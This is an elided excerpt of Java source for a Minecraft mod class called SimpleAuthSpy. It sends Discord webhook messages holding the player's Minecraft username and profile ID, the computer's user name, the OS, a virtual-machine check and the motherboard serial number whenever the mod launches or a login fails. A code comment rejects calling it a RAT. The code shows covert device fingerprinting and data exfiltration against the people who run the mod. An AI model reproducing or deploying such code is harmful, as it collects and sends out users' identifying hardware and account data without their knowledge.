...
public class SimpleAuthSpy { // If u call this class rat then pls get brain
	public static String enteredKey = "";
	public static int numberCheck = 0;
	
    public static void sendLogginSuccess() {
        try {
            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/");
	...
	public static void sendLogginFail() {
        try {
			...
			embed.addField("Is In VM (Mac)", "" + SimpleAuthSpy.getVMDRespond(), false);
			embed.addField("Motherboard Serial Numbed", SimpleAuthSpy.getMachineSerialNumber(), false);
	...
	public static void sendLaunch() {
		try {
			...
			WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
			numberCheck = 69;
			embed.setTitle(Minecraft.getMinecraft().getSession().getUsername() + " ran SimpleAuth");
			embed.setThumbnail("https://crafatar.com/avatars/" + Minecraft.getMinecraft().getSession().getProfile().getId() + "?size=128&overlay");
		...
		RunRefuser.getResutlTwo();
		if (RunRefuser.resultTwo != false) {
			// empty
		} else {
			numberCheck = 0;
		}
	...
	public static void sendAttackerInfo() {
        try {
            WebhookUtil webhook = new WebhookUtil("https://discord.com/api/webhooks/");
            WebhookUtil.EmbedObject embed = new WebhookUtil.EmbedObject();
			...
			embed.addField("PC-Name", "" + "||" + System.getProperty("user.name") + "||", false);
			embed.addField("OS-Name", "" + System.getProperty("os.name"), false);
			embed.addField("In In VM", "" + SimpleAuthSpy.getVMDRespond(), false);
			numberCheck = 1;
			embed.addField("Motherboard Serial Numbed", SimpleAuthSpy.getMachineSerialNumber(), false);
